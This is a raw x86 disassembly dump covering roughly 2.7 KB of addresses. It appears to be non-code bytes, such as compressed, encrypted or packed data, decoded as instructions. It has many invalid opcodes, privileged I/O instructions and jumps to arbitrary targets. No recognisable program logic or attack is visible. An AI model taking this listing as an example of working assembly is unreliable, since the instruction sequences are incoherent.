  4280aa:	pop    esp
  4280ab:	fsubr  DWORD PTR [edx+0x5a]
  4280ae:	adc    al,0x70
  4280b0:	out    0x9c,eax
  4280b2:	pop    edi
  4280b3:	mov    eax,ds:0x2535f755
  4280b8:	mov    ecx,0x83eac26b
  4280bd:	call   0x1ed7317c
  4280c2:	dec    ebp
  4280c3:	mov    ds:0xbd4dc33e,al
  4280c8:	mov    DWORD PTR [ebp-0x55ab44c9],esi
  4280ce:	dec    esp
  4280cf:	addr16 dec edi
  4280d1:	jb     0x428120
  4280d3:	mov    ?,WORD PTR [ebx]
  4280d5:	and    DWORD PTR [ebx+eax*4+0x6717b364],esp
  4280dc:	repz (bad) 
  4280de:	dec    ebx
  4280df:	pop    edi
  4280e0:	dec    ebx
  4280e1:	sub    eax,DWORD PTR [bx+si-0x172e]
  4280e6:	cmp    edx,DWORD PTR [edx]
  4280e8:	loope  0x42809a
  4280ea:	test   DWORD PTR [edi+0x1b],0xacfc6554
  4280f1:	pop    esp
  4280f2:	(bad)  
  4280f3:	sti    
  4280f4:	push   esi
  4280f5:	stos   DWORD PTR es:[edi],eax
  4280f6:	mov    bh,0x97
  4280f8:	dec    ebx
  4280f9:	and    BYTE PTR [ecx+0x50efa7eb],dh
  4280ff:	mov    al,ds:0x60f87b84
  428104:	lods   eax,DWORD PTR ds:[esi]
  428105:	xchg   DWORD PTR [edx+0x6d],ebx
  428108:	pop    esi
  428109:	mov    esi,0x9b906e95
  42810e:	pushf  
  42810f:	sub    al,0x0
	...
  428171:	add    BYTE PTR [eax],al
  428173:	add    bh,bl
  428175:	out    dx,al
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	and    ch,BYTE PTR [ebx-0x1e]
  428183:	inc    edi
  428184:	cmp    BYTE PTR [ecx+eax*1+0x10400],ch
  42818b:	add    BYTE PTR [esi+0x576bf98],cl
  428191:	add    BYTE PTR [edi-0x3909561a],al
  428197:	daa    
  428198:	fstp   DWORD PTR [ebp+0x11]
  42819b:	or     al,0xb6
  42819d:	push   ebp
  42819e:	ds sahf 
  4281a0:	pcmpeqw mm7,QWORD PTR [ebp+0x33]
  4281a4:	icebp  
  4281a5:	xor    edi,edx
  4281a7:	sub    al,0xd9
  4281a9:	shr    cl,cl
  4281ab:	repz push esi
  4281ad:	mov    edx,0xa832fa01
  4281b2:	adc    eax,0xacbe50eb
  4281b7:	arpl   si,di
  4281b9:	adc    BYTE PTR [ecx-0x6985ddb1],0x0
  4281c0:	push   0x9e99c968
  4281c5:	ret    
  4281c6:	in     eax,dx
  4281c7:	pusha  
  4281c8:	xchg   edx,eax
  4281c9:	test   al,0x68
  4281cb:	(bad)
  4281ce:	sub    eax,0x6930416a
  4281d3:	cdq    
  4281d4:	div    DWORD PTR ds:0xbad389bf
  4281da:	lds    edx,FWORD PTR [edi-0x11705252]
  4281e0:	cmp    DWORD PTR [edi+eax*4],ebp
  4281e3:	test   eax,0x6a80b52c
  4281e8:	sbb    BYTE PTR [edx+0x1b],ah
  4281eb:	push   cs
  4281ec:	push   cs
  4281ed:	push   ss
  4281ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281ef:	and    ebp,DWORD PTR [eax+0xe0d16ce]
  4281f5:	dec    ebx
  4281f6:	sub    ah,BYTE PTR [edx-0x1e]
  4281f9:	xor    edx,DWORD PTR [edi+0x4b6b7929]
  4281ff:	jne    0x4281e4
  428201:	ret    
  428202:	jno    0x428224
  428204:	push   eax
  428205:	sbb    DWORD PTR [edx-0x13],edx
  428208:	jecxz  0x428191
  42820a:	or     BYTE PTR [ecx],bl
  42820c:	mov    eax,DWORD PTR [eax+0x6af3db9e]
  428212:	imul   esp,DWORD PTR [edx+0x691c2ff7],0x453d6191
  42821c:	aam    0xd6
  42821e:	retf   
  42821f:	mov    dh,0x50
  428221:	xor    al,0xf9
  428223:	std    
  428224:	push   esi
  428225:	cmp    eax,0xec407ae2
  42822a:	xor    al,0x16
  42822c:	push   0xffffffa8
  42822e:	stos   BYTE PTR es:[edi],al
  42822f:	xor    DWORD PTR [ebx+0x7],esp
  428232:	adc    eax,0x6e934b72
  428237:	or     al,0xaf
  428239:	jg     0x428249
  42823b:	pusha  
  42823c:	inc    eax
  42823d:	push   esp
  42823e:	data16 icebp 
  428240:	dec    esi
  428241:	rcr    DWORD PTR [edx+0x7f],1
  428244:	cmp    DWORD PTR [eax+0x494bd06d],esp
  42824a:	addr16 xchg esi,eax
  42824c:	fadd   QWORD PTR [ebp-0x168d6d09]
  428252:	xor    eax,0xb29777f6
  428257:	sub    esi,0x87b43c7
  42825d:	xchg   ebp,eax
  42825e:	xor    al,0xaf
  428260:	stos   DWORD PTR es:[edi],eax
  428261:	pop    ecx
  428262:	pop    es
  428263:	or     dh,BYTE PTR [ecx-0x48aa91f0]
  428269:	loopne 0x428293
  42826b:	lods   al,BYTE PTR ds:[esi]
  42826c:	sub    DWORD PTR ds:0x8d40ba10,esi
  428273:	xor    edx,esi
  428275:	pop    ecx
  428276:	push   esp
  428277:	call   0xda9b:0x30a57d19
  42827e:	das    
  42827f:	cdq    
  428280:	adc    dh,BYTE PTR [ebp+0x202120b5]
  428286:	icebp  
  428287:	scas   eax,DWORD PTR es:[edi]
  428288:	add    DWORD PTR [ecx],edx
  42828a:	adc    DWORD PTR [ebp-0x217ca2d],esp
	...
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	adc    BYTE PTR [esi],dl
  428302:	inc    ebx
  428303:	mov    edi,0x1ad3c
  428308:	add    al,0x1
  42830a:	add    BYTE PTR [eax],al
  42830c:	xchg   edx,eax
  42830d:	mov    esi,0x7c6eec70
  428312:	test   DWORD PTR [eax-0x49731d49],esi
  428318:	jmp    0x4282c2
  42831a:	sub    edi,edx
  42831c:	jmp    0x705e7865
  428321:	push   eax
  428322:	shr    BYTE PTR [edi],1
  428324:	push   ds
  428325:	mov    edx,0x9fe04836
  42832a:	jmp    0xaeb2:0xd4b6f9c5
  428331:	xor    ebx,edx
  428333:	pop    esp
  428334:	xchg   ch,dh
  428336:	js     0x428382
  428338:	push   ecx
  428339:	scas   al,BYTE PTR es:[edi]
  42833a:	mov    al,0x2
  42833c:	(bad)  
  42833d:	shl    eax,cl
  42833f:	lock dec edi
  428341:	setle  BYTE PTR [ecx-0xf]
  428345:	fisub  DWORD PTR [edx*8+0x304bbb7e]
  42834c:	test   eax,0xbbadc0b1
  428351:	add    DWORD PTR [edi],esi
  428353:	or     esi,edx
  428355:	mov    al,0x5f
  428357:	inc    esp
  428358:	add    ch,bh
  42835a:	mov    esi,ebx
  42835c:	adc    ch,dh
  42835e:	test   al,0xdb
  428360:	mov    ch,0x8b
  428362:	icebp  
  428363:	jbe    0x42832e
  428365:	lahf   
  428366:	mov    ecx,0xed6d5222
  42836b:	xchg   ecx,eax
  42836c:	xor    DWORD PTR [ebx],0x50
  42836f:	mov    eax,ds:0xddeece9f
  428374:	cmp    eax,0xd9fcfdd3
  428379:	out    dx,eax
  42837a:	jns    0x4283e1
  42837c:	and    BYTE PTR [ebx+0x78],ah
  42837f:	or     eax,0x545dd9a3
  428384:	(bad)  
  428385:	cwde   
  428386:	pusha  
  428387:	mov    ecx,0x1fd104ce
  42838c:	pop    ecx
  42838d:	dec    eax
  42838e:	cld    
  42838f:	push   0x49
  428391:	or     al,bh
  428393:	dec    eax
  428394:	nop
  428395:	fmul   DWORD PTR [esi+eax*2-0x4588261c]
  42839c:	(bad)  
  42839d:	push   ecx
  42839e:	scas   eax,DWORD PTR es:[edi]
  42839f:	fnsave [esi]
  4283a1:	out    0x5c,eax
  4283a3:	aaa    
  4283a4:	into   
  4283a5:	loope  0x428351
  4283a7:	sti    
  4283a8:	mov    ds:0x597857db,al
  4283ad:	xchg   edx,eax
  4283ae:	int    0x5f
  4283b0:	lods   al,BYTE PTR ds:[esi]
  4283b1:	pop    edx
  4283b2:	retf   
  4283b3:	mov    BYTE PTR [esi-0xf],bl
  4283b6:	outs   dx,BYTE PTR ds:[esi]
  4283b7:	out    0xb3,al
  4283b9:	pop    edi
  4283ba:	(bad)  [edx-0x790606fe]
  4283c0:	fwait
  4283c1:	mov    esp,0x2ea4a84
  4283c6:	cmp    eax,DWORD PTR [esi+edx*2+0x6d9e6834]
  4283cd:	adc    eax,0xcb95a376
  4283d2:	push   esi
  4283d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4283d4:	repnz sub esp,DWORD PTR [eax+eax*2+0x225235bb]
  4283dc:	push   esi
  4283dd:	xchg   BYTE PTR [esi+0x4a5a96fb],bh
  4283e3:	(bad)  
  4283e4:	or     eax,0xc9b25a3d
  4283e9:	xchg   esp,eax
  4283ea:	dec    ebx
  4283eb:	jge    0x428384
  4283ed:	pop    edi
  4283ee:	int3   
  4283ef:	sub    ah,ah
  4283f1:	outs   dx,DWORD PTR ds:[esi]
  4283f2:	or     BYTE PTR [edi-0x67e638d6],dh
  4283f8:	test   ecx,esp
  4283fa:	mov    DWORD PTR ds:0xd50d9fce,ecx
  428400:	cld    
  428401:	dec    eax
  428402:	mov    ecx,0xb4105c3a
  428407:	and    al,BYTE PTR [ebp-0x341a1671]
  42840d:	popf   
  42840e:	test   ebx,esp
	...
  428474:	push   cs
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0x7babfb32
  428481:	imul   DWORD PTR [edx-0x14]
  428484:	inc    eax
  428485:	scas   al,BYTE PTR es:[edi]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	scas   eax,DWORD PTR es:[edi]
  42848d:	push   edx
  42848e:	arpl   dx,bp
  428490:	retf   0x1c2d
  428493:	cli    
  428494:	std    
  428495:	ja     0x4284c0
  428497:	push   eax
  428498:	aam    0xee
  42849a:	or     esi,DWORD PTR [ecx+0x468d62c1]
  4284a0:	xchg   DWORD PTR [ebp-0x2],edx
  4284a3:	push   0x4ebc109f
  4284a8:	and    eax,0x5151a1ae
  4284ad:	sub    esp,DWORD PTR [eax-0x51]
  4284b0:	mov    al,0x9f
  4284b2:	cld    
  4284b3:	xor    DWORD PTR [eax-0x20159b86],edx
  4284b9:	push   ecx
  4284ba:	mov    ebx,DWORD PTR [esi-0x30]
  4284bd:	sub    ebx,DWORD PTR [edi]
  4284bf:	mov    bl,BYTE PTR [eax]
  4284c1:	stc    
  4284c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4284c3:	mov    ebp,0x9014b981
  4284c8:	std    
  4284c9:	mov    cl,0xb5
  4284cb:	xchg   BYTE PTR [ebp+0x43],bh
  4284ce:	pop    edx
  4284cf:	push   eax
  4284d0:	sbb    al,0x54
  4284d2:	jns    0x42854a
  4284d4:	mov    ecx,0x47e10ff7
  4284d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284da:	pop    edx
  4284db:	popa   
  4284dc:	pop    ebp
  4284dd:	lahf   
  4284de:	stos   DWORD PTR es:[edi],eax
  4284df:	and    BYTE PTR [edi+0x7a27aee2],al
  4284e5:	aad    0xbd
  4284e7:	sub    eax,0xdad4188e
  4284ec:	into   
  4284ed:	sub    BYTE PTR [ebp-0x173c3cd8],ah
  4284f3:	sbb    ah,ch
  4284f5:	inc    eax
  4284f6:	pusha  
  4284f7:	jecxz  0x4284c5
  4284f9:	mov    ds,WORD PTR [ebx+0x6845fb86]
  4284ff:	jg     0x428537
  428501:	sbb    bh,BYTE PTR [ecx+0x51db0b6f]
  428507:	push   ecx
  428508:	mov    esi,0x319cf598
  42850d:	xchg   ecx,eax
  42850e:	inc    esp
  42850f:	sub    BYTE PTR [ebp+ecx*1-0x41],bl
  428513:	retf   
  428514:	xchg   edi,eax
  428515:	loopne 0x4284aa
  428517:	stos   DWORD PTR es:[edi],eax
  428518:	xchg   DWORD PTR [esi+0x5b],ebp
  42851b:	leave  
  42851c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42851d:	adc    edi,DWORD PTR [eax]
  42851f:	xchg   DWORD PTR [eax],ebp
  428521:	gs cdq 
  428523:	push   eax
  428524:	cmp    BYTE PTR [edx],dl
  428526:	pop    ecx
  428527:	fimul  DWORD PTR [ecx]
  428529:	out    dx,al
  42852a:	jmp    0x669f:0x69fdb46
  428531:	cmp    al,0xe7
  428533:	ror    DWORD PTR [eax-0x6b94c208],cl
  428539:	cli    
  42853a:	sbb    dl,dl
  42853c:	into   
  42853d:	mov    ds:0x21d0f228,al
  428542:	adc    BYTE PTR [ebx+0x3b],ah
  428545:	inc    ebx
  428546:	(bad)  
  428547:	(bad)
  42854a:	or     cl,BYTE PTR ds:0x1d8f01f
  428550:	lods   eax,DWORD PTR ds:[esi]
  428551:	mov    al,0x98
  428554:	imul   edi,DWORD PTR [ebx+0x11],0xb92cae40
  42855b:	pop    esi
  42855c:	dec    ebx
  42855d:	mov    bh,0x86
  42855f:	neg    BYTE PTR [ebx+0x43514b02]
  428565:	aam    0xf3
  428567:	pop    ecx
  428568:	popa   
  428569:	jmp    0x9759a179
  42856e:	(bad)  
  42856f:	fincstp 
  428571:	cwde   
  428572:	loope  0x4284fd
  428574:	jle    0x428562
  428576:	(bad)  
  428578:	inc    edx
  428579:	fist   DWORD PTR [esi]
  42857b:	cmp    al,0xeb
  42857d:	xor    dh,ch
  42857f:	pushf  
  428580:	es cmc 
  428582:	mov    DWORD PTR ds:0x1640cd4d,edx
  428588:	outs   dx,DWORD PTR ds:[esi]
  428589:	or     eax,0x8c738dfb
  42858e:	repnz mov ah,0x0
	...
  4285f1:	add    BYTE PTR [eax],al
  4285f3:	add    BYTE PTR [ecx-0xa],dl
  4285f6:	xor    eax,0x5bffb73e
  4285fb:	inc    edi
  4285fd:	mov    esi,0xe1f0a3f6
  428602:	clc    
  428603:	sahf   
  428604:	inc    esp
  428605:	scas   eax,DWORD PTR es:[edi]
  428606:	add    DWORD PTR [eax],eax
  428608:	add    al,0x1
  42860a:	add    BYTE PTR [eax],al
  42860c:	test   eax,0xc0c8620
  428611:	push   es
  428612:	dec    edx
  428613:	or     eax,0x19026b67
  428618:	xor    ah,BYTE PTR [ebx+0xc5547a]
  42861e:	xor    eax,DWORD PTR ds:0xb4ee33c4
  428624:	xchg   esp,eax
  428625:	cwde   
  428626:	xlat   BYTE PTR ds:[ebx]
  428627:	xchg   edx,eax
  428628:	inc    eax
  428629:	(bad)  
  42862b:	test   DWORD PTR [esi-0x72],esi
  42862e:	cli    
  42862f:	xchg   edx,eax
  428630:	out    0xe,eax
  428632:	test   eax,0x6a11e50
  428637:	mov    al,0xdd
  428639:	jae    0x428624
  42863b:	xchg   ebp,eax
  42863c:	pop    esp
  42863d:	dec    ecx
  42863e:	xchg   ebp,eax
  42863f:	add    BYTE PTR cs:[edx+0x25],dh
  428643:	cmp    dl,dl
  428645:	mov    ecx,DWORD PTR ds:0x6c6b6003
  42864b:	jmp    0xcf9e:0x2980f6f0
  428652:	ja     0x42861f
  428654:	push   ebx
  428655:	cmc    
  428656:	and    esi,DWORD PTR [edi]
  428658:	js     0x42867a
  42865a:	adc    edx,DWORD PTR [ebx+0x6673660e]
  428660:	fnsave [ebp-0x20e53499]
  428666:	in     eax,0xd2
  428668:	sub    eax,0x3baa7a4
  42866d:	cmp    al,0x9f
  42866f:	pop    ds
  428670:	cmp    DWORD PTR cs:[esi],ebp
  428673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428674:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428675:	add    ch,BYTE PTR [esi]
  428677:	cmp    eax,DWORD PTR [eax]
  428679:	push   ecx
  42867a:	sbb    esp,ecx
  42867c:	jg     0x4286f5
  42867e:	push   edx
  42867f:	lods   eax,DWORD PTR ds:[esi]
  428680:	xchg   esi,eax
  428681:	mov    edi,ecx
  428683:	(bad)  
  428684:	fcomp  QWORD PTR [ecx+ecx*1-0x50]
  428688:	not    edi
  42868a:	add    DWORD PTR [ebp+0x40cf7245],edx
  428690:	lods   eax,DWORD PTR ds:[esi]
  428691:	mov    ah,0x2
  428693:	fadd   DWORD PTR ds:[ebp+0x6a7e01b0]
  42869a:	dec    ebx
  42869b:	icebp  
  42869c:	aaa    
  42869d:	push   ebp
  42869e:	pop    eax
  42869f:	or     BYTE PTR [edi-0x47a8367b],bl
  4286a5:	jno    0x42870f
  4286a7:	adc    ebp,edx
  4286a9:	push   esi
  4286aa:	mov    dl,0xd7
  4286ac:	fisubr WORD PTR [esi+ecx*8+0x4f16f7dc]
  4286b3:	pop    ecx
  4286b4:	push   esi
  4286b5:	jno    0x4286bc
  4286b7:	push   es
  4286b8:	push   ebx
  4286b9:	jle    0x42866c
  4286bb:	aad    0x11
  4286bd:	mov    esi,0x54a1c08b
  4286c2:	ror    BYTE PTR [edi],cl
  4286c4:	jmp    0x864b3e28
  4286c9:	push   esp
  4286ca:	dec    ecx
  4286cb:	scas   eax,DWORD PTR es:[edi]
  4286cc:	jl     0x4286ec
  4286ce:	adc    edx,DWORD PTR [ecx+0x2b]
  4286d1:	jge    0x4286d9
  4286d3:	das    
  4286d4:	call   0xb3e9:0x98973d80
  4286db:	in     eax,dx
  4286dc:	dec    edx
  4286dd:	ret    
  4286de:	mov    dh,0x2b
  4286e0:	nop
  4286e1:	leave  
  4286e2:	dec    edi
  4286e3:	icebp  
  4286e4:	sub    eax,0xbe152108
  4286e9:	sub    eax,0x25ce78bd
  4286ee:	mov    eax,ds:0x1ca8a11d
  4286f3:	push   es
  4286f4:	cmp    BYTE PTR [ecx-0x72ba3959],0x2e
  4286fb:	and    esp,eax
  4286fd:	pop    esi
  4286fe:	xchg   esi,eax
  4286ff:	scas   al,BYTE PTR es:[edi]
  428700:	sub    ecx,eax
  428702:	or     DWORD PTR [esi+0x1f],esp
  428705:	or     DWORD PTR [eax-0x6b626171],0x105da1fe
  42870f:	test   DWORD PTR [eax],eax
	...
  428771:	add    BYTE PTR [eax],al
  428773:	add    BYTE PTR [esi+0x5b],dl
  428776:	xor    al,0x78
  428778:	cmp    eax,0xe77f5e7f
  42877d:	inc    ebp
  42877e:	call   0x3a37de96
  428783:	add    eax,0x1b048
  428788:	add    al,0x1
  42878a:	add    BYTE PTR [eax],al
  42878c:	push   ds
  42878d:	lods   eax,DWORD PTR ds:[esi]
  42878e:	sbb    DWORD PTR [ebx+0x788e9de8],0xd8cd3feb
  428798:	lds    edi,FWORD PTR [eax+0xa]
  42879b:	call   FWORD PTR [ecx]
  42879d:	mov    BYTE PTR [ebp-0x1a],dh
  4287a0:	push   0xfe1ae3dd
  4287a5:	adc    BYTE PTR [edi+ebx*1-0x1c64e299],al
  4287ac:	add    ecx,DWORD PTR [ecx-0x30]
  4287af:	stc    
  4287b0:	dec    esp
  4287b1:	ins    BYTE PTR es:[edi],dx
  4287b2:	pop    eax
  4287b3:	mov    edi,ebp
  4287b5:	arpl   WORD PTR [edx-0x576cb596],di
  4287bb:	cmp    edx,DWORD PTR [eax+0x67]
  4287be:	inc    esp
  4287bf:	repz fstp st(5)
  4287c2:	xor    edx,edx
  4287c4:	ret    0x7435
  4287c7:	sub    edx,DWORD PTR [esi-0x5c5d6254]
  4287cd:	jne    0x428801
  4287cf:	mov    edi,0xa50e953
  4287d4:	ins    BYTE PTR es:[edi],dx
  4287d5:	add    al,0xc8
  4287d7:	aad    0xf5
  4287d9:	loope  0x4287a7
  4287db:	out    dx,eax
  4287dc:	mov    bh,0x6d
  4287de:	out    0xe4,eax
  4287e0:	outs   dx,DWORD PTR ds:[esi]
  4287e1:	iret   
  4287e2:	xor    dl,BYTE PTR [edi+0xa]
  4287e5:	shl    DWORD PTR [ecx-0x141ef156],cl
  4287eb:	jp     0x428789
  4287ed:	sub    ebx,edx
  4287ef:	aaa    
  4287f0:	ss out 0xdf,eax
  4287f3:	inc    ebx
  4287f4:	daa    
  4287f5:	popa   
  4287f6:	inc    ebp
  4287f7:	or     dl,BYTE PTR [ebx-0x1960a8dd]
  4287fd:	push   0xda3b4a18
  428802:	retf   
  428803:	rcr    ah,0xa3
  428806:	sbb    al,0xd0
  428808:	inc    eax
  428809:	(bad)  
  42880a:	jmp    0x91310f52
  42880f:	inc    esi
  428810:	pop    es
  428811:	pop    ecx
  428812:	sbb    BYTE PTR [edx],ch
  428814:	pop    ds
  428815:	test   al,0x17
  428817:	js     0x428862
  428819:	stos   DWORD PTR es:[edi],eax
  42881a:	xor    cl,al
  42881c:	fs inc edx
  42881e:	mov    cl,0x3
  428820:	xchg   edx,eax
  428821:	cli    
  428822:	adc    dh,bl
  428824:	xor    DWORD PTR [edx],ebx
  428826:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428827:	lock test al,0x45
  42882a:	xor    DWORD PTR [esi],eax
  42882c:	xor    dh,BYTE PTR [ebx-0xf]
  42882f:	sub    BYTE PTR ds:0xdb2efb0a,0xa9
  428836:	leave  
  428837:	mov    edi,ebp
  428839:	pop    esi
  42883a:	leave  
  42883b:	mov    edi,0x8db4a3a8
  428840:	test   al,0x80
  428842:	test   DWORD PTR [ecx],edx
  428844:	pop    ebp
  428845:	sub    BYTE PTR [edx-0x41eff78d],ch
  42884b:	push   edi
  42884c:	div    esi
  42884e:	stos   DWORD PTR es:[edi],eax
  42884f:	xor    BYTE PTR [eax],dh
  428851:	aam    0xe0
  428853:	retf   
  428854:	in     al,0xee
  428856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428857:	inc    ebx
  428858:	dec    edx
  428859:	jl     0x4287dc
  42885b:	mov    eax,ds:0xd9b02c16
  428860:	sub    ebx,DWORD PTR [ebx+edx*2-0x15]
  428864:	or     BYTE PTR [esi],dh
  428866:	outs   dx,DWORD PTR ds:[esi]
  428867:	jne    0x4288cd
  428869:	ds stc 
  42886b:	es push esi
  42886d:	loope  0x4288af
  42886f:	cwde   
  428870:	xchg   edi,eax
  428871:	xlat   BYTE PTR ds:[ebx]
  428872:	ret    
  428873:	xor    BYTE PTR [ebp-0x57],dh
  428876:	pop    esp
  428877:	push   0x16
  428879:	mov    ds:0xf7ea4eb3,eax
  42887e:	mov    ecx,ebp
  428880:	daa    
  428881:	dec    esp
  428882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428883:	js     0x428871
  428885:	pop    ebx
  428886:	jle    0x4288a4
  428888:	push   ss
  428889:	into   
  42888a:	(bad)  
  42888b:	pusha  
  42888c:	or     ecx,edi
  42888e:	adc    BYTE PTR [eax+eax*1+0x0],dl
	...
  4288f2:	add    BYTE PTR [eax],al
  4288f4:	es jp  0x428968
  4288f7:	les    edi,FWORD PTR [ebp-0x31]
  4288fa:	mov    bh,0xfa
  4288fc:	arpl   WORD PTR [esi-0x7e0f62f1],bx
  428902:	or     esi,DWORD PTR [esp+ecx*2+0x40001b1]
  428909:	add    DWORD PTR [eax],eax
  42890b:	add    bh,ah
  42890d:	push   esi
  42890e:	sar    bl,cl
  428910:	push   es
  428911:	ja     0x428969
  428913:	in     al,0xcb
  428915:	pusha  
  428916:	mov    ebp,0xa6a641a3
  42891b:	sub    al,ah
  42891d:	xor    ch,BYTE PTR [eax+0x7a2569e7]
  428923:	adc    ah,BYTE PTR [ebp-0x30]
  428926:	(bad)  
  428927:	jmp    DWORD PTR [ebp-0x2e]
  42892a:	fsub   QWORD PTR [edx]
  42892c:	sahf   
  42892d:	cmp    DWORD PTR [ebp+0x24],edi
  428930:	pop    esi
  428931:	inc    eax
  428932:	pop    ebx
  428933:	add    DWORD PTR [edi],0x320061fc
  428939:	push   0x10ed0270
  42893e:	jne    0x428964
  428940:	fldenv [eax+0x1d]
  428943:	loope  0x4288ed
  428945:	jno    0x428940
  428947:	push   edi
  428948:	sub    al,0x5f
  42894a:	or     al,0x8f
  42894c:	sbb    ah,BYTE PTR [edx-0x11c9360e]
  428952:	addr16 sub eax,0x25cf3ccd
  428958:	add    al,0x51
  42895a:	scas   eax,DWORD PTR es:[edi]
  42895b:	sub    DWORD PTR [eax],ebx
  42895d:	jmp    0x6f02:0xc246ae16
  428964:	dec    edx
  428965:	ret    
  428966:	sbb    eax,DWORD PTR [ebx-0x3e]
  428969:	(bad)  
  42896a:	xor    eax,0xf8f5d22d
  42896f:	push   edx
  428970:	ja     0x42894e
  428972:	retf   
  428973:	fistp  WORD PTR [eax+0x72]
  428976:	ror    dl,0x9d
  428979:	scas   eax,DWORD PTR es:[edi]
  42897a:	cmp    ebx,esp
  42897c:	sti    
  42897d:	xchg   DWORD PTR [edi+esi*2],ecx
  428980:	jb     0x42897d
  428982:	pop    esp
  428983:	xor    dl,cl
  428985:	lds    dx,DWORD PTR [edi]
  428988:	xchg   esi,eax
  428989:	in     al,0xfe
  42898b:	adc    al,0x1
  42898d:	cmp    al,0x1d
  42898f:	test   DWORD PTR [edx],0x5849292e
  428995:	loopne 0x4289e4
  428997:	fcomp  DWORD PTR [edx+0x4e]
  42899a:	shl    DWORD PTR [esp+esi*4+0x78512874],0x7e
  4289a2:	push   cs
  4289a3:	je     0x428991
  4289a5:	scas   al,BYTE PTR es:[edi]
  4289a6:	das    
  4289a7:	aad    0xfa
  4289a9:	retf   0x5f54
  4289ac:	pop    DWORD PTR [eax-0x40991418]
  4289b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289b3:	jne    0x428a1c
  4289b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4289b6:	or     esi,DWORD PTR [ebx]
  4289b8:	rcl    DWORD PTR [ebx+0x6e0618d1],cl
  4289be:	aas    
  4289bf:	lahf   
  4289c0:	(bad)  [ecx]
  4289c2:	clc    
  4289c3:	mov    esp,0xa85006a0
  4289c8:	mov    dl,0x40
  4289ca:	shl    dl,1
  4289cc:	addr16 in al,dx
  4289ce:	jg     0x428a1d
  4289d0:	dec    ecx
  4289d1:	or     al,0x83
  4289d3:	retf   
  4289d4:	cmc    
  4289d5:	lds    esi,FWORD PTR [ecx]
  4289d7:	jecxz  0x428a4c
  4289d9:	js     0x428a56
  4289db:	mov    al,ds:0x996b3409
  4289e0:	call   FWORD PTR [edx]
  4289e2:	add    cl,0x47
  4289e5:	inc    edx
  4289e7:	adc    dh,cl
  4289e9:	stc    
  4289ea:	jmp    0x4289dd
  4289ec:	leave  
  4289ed:	sbb    eax,0x7a9236ef
  4289f2:	dec    ebp
  4289f3:	adc    ah,al
  4289f5:	xor    eax,0xe25b665b
  4289fa:	into   
  4289fb:	pusha  
  4289fc:	cld    
  4289fd:	jl     0x428a09
  4289ff:	cmp    DWORD PTR [eax+0x51],esp
  428a02:	inc    edx
  428a03:	mov    eax,ds:0xa34b4e03
  428a08:	stos   DWORD PTR es:[edi],eax
  428a09:	lahf   
  428a0a:	or     BYTE PTR [ebx-0xfe78d86],0x0
	...
  428a71:	add    BYTE PTR [eax],al
  428a73:	add    BYTE PTR [ebp+0xc],cl
  428a76:	clc    
  428a77:	pop    ebx
  428a78:	stc    
  428a79:	(bad)  
  428a7a:	out    dx,eax
  428a7b:	push   ds
  428a7c:	pop    ds
  428a7d:	bound  edx,QWORD PTR [eax+0x23dd7613]
  428a83:	fist   WORD PTR [eax-0x4e]
  428a86:	add    DWORD PTR [eax],eax
  428a88:	add    al,0x1
  428a8a:	add    BYTE PTR [eax],al
  428a8c:	clc    
  428a8d:	inc    eax
  428a8e:	popa   
  428a8f:	sbb    eax,0x2062a657
  428a94:	xor    BYTE PTR [ebp+eax*8-0x50e79807],0xe8
  428a9c:	cmp    bh,BYTE PTR [ecx+0x56b6c2df]
  428aa2:	mov    esi,0x89f300f0
  428aa7:	jbe    0x428b24
  428aa9:	mov    ebp,0xe9972e41
  428aae:	retf   0x4d3c
  428ab1:	rcl    BYTE PTR ds:0xe9339526,1
  428ab7:	adc    DWORD PTR [eax-0x1c5201b8],eax
  428abd:	shl    BYTE PTR [edx+0x131813c2],cl
  428ac3:	push   0xe417fb0f
  428ac8:	sub    eax,0x3ebb4054
  428acd:	and    DWORD PTR [eax],edx
  428acf:	jl     0x428b01
  428ad1:	mov    edx,0x300e886b
  428ad6:	jg     0x428ac4
  428ad8:	push   edx
  428ad9:	pop    eax
  428ada:	repnz loop 0x428ac7
  428add:	adc    eax,0x20a77446
  428ae2:	add    ah,BYTE PTR [esi-0xf]
  428ae5:	cmp    al,0x16
  428ae7:	sbb    BYTE PTR [ecx-0x77fe3b],ah
  428aed:	sbb    ecx,DWORD PTR [ecx]
  428aef:	arpl   WORD PTR [eax-0x45],dx
  428af2:	sbb    DWORD PTR [ebp-0x16],esp
  428af5:	or     eax,0xc89c06d0
  428afa:	stos   BYTE PTR es:[edi],al
  428afb:	and    DWORD PTR [edx+0x60],0xffffffa9
  428aff:	dec    ebx
  428b00:	retf   
  428b01:	lea    eax,[ecx+0xd6f2a0c]
  428b07:	pop    es
  428b08:	scas   eax,DWORD PTR es:[edi]
  428b09:	add    al,0x19
  428b0b:	and    BYTE PTR [ecx],cl
  428b0d:	sahf   
  428b0e:	idiv   DWORD PTR [esi]
  428b10:	mov    ecx,0x20befaf7
  428b15:	adc    edx,DWORD PTR [eax]
  428b17:	das    
  428b18:	mov    WORD PTR [ecx],cs
  428b1a:	mov    ch,0xb1
  428b1c:	je     0x428b43
  428b1e:	aad    0x21
  428b20:	popa   
  428b21:	push   0x38
  428b23:	rcr    BYTE PTR [ebx],cl
  428b25:	xchg   esi,eax
  428b26:	stc    
  428b27:	mov    ah,ah
